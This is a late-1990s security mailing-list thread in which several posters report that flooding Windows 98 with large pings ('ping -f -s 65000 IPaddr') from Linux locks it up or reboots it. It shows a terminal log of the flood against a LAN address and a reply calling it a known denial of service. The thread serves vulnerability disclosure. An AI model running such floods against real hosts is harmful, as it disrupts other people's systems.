Hey...
        I made what you suggested, and it's true... But in my case the
results were a little worse than yours...
        Windows 98 *REBOOTED* after a ping -f 65000... and wasn't need
to make several screen boxes... With only one ping -f 65000 the system
rebooted.

I issued "ping -f -s 65000 my-win98-address" and after a single return, win98
locked up cold. I was ssh'd from win98 to linux to issue the ping, so I might
have had more returns than timing allowed to be displayed before I locked
up.

Hello all,

        As I said before, forgive me, because my english is not so good!
        I'll make a "Multi-reply" in this email... It's easier ;)
        Thanks for all the replies!

        Sorry, I made a mistake when sent the email to Bugtraq. The
correct command (From Linux Slackware 3.6 Kernel 2.0.36) line is:

                ping -f -s 65000 IPaddr

        Try from a linux... I got these results flooding from a
Linux Slackware 3.6 Kernel 2.0.36...

        Hehe... But a synflood just made the LAN Communication slower,
and didn't affected Windows 98 than pingflood affected!

Subject: Pingflood attack against Windows98 - The Test

Hello all,

         This is what is happening when I ping flood a Windows98 from a
Linux Slackware 3.6 (Kernel 2.0.36).


-Before the attack-

linux:~# ping 192.168.1.4
PING 192.168.1.4 (192.168.1.4): 56 data bytes
64 bytes from 192.168.1.4: icmp_seq=0 ttl=128 time=0.5 ms
64 bytes from 192.168.1.4: icmp_seq=1 ttl=128 time=0.5 ms

--- 192.168.1.4 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.5/0.5/0.5 ms


-The Attack-

linux:~# ping -f -s 65000 192.168.1.4
PING 192.168.1.3 (192.168.1.4): 65000 data bytes
.......................................................................
...................................................../*After lots of
little dots... Windows98 Rebooted*/...<CTRL+C>

--- 192.168.1.4 ping statistics ---
11440 packets transmitted, 228 packets received, 98% packet loss
round-trip min/avg/max = 0.6/32.0/64.2 ms


-After the attack-

linux:~# ping 192.168.1.4
PING 192.168.1.4 (192.168.1.4): 56 data bytes

--- 192.168.1.4 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss

---

        It's what's happening here... Anyone of you got the same
results?

Sorry, but I'm afraid this thread is a little bit out-of-date. Pingflood
against Windows 95/98 is a well-known shool DoS. ping -s -f or ping -s -l
over local networks seems to cause Windows to lock-on permanently (or
temporarily, depending on weather), or even reboot. Is there anything more
to talk about?:>

Dear Mr. Zalewski,

        Since Microsoft's announced that Windows 95 DoSs were corrected
in Windows 98, and we found this bug AGAIN... I think that this thread
IS NOT out-of-date.
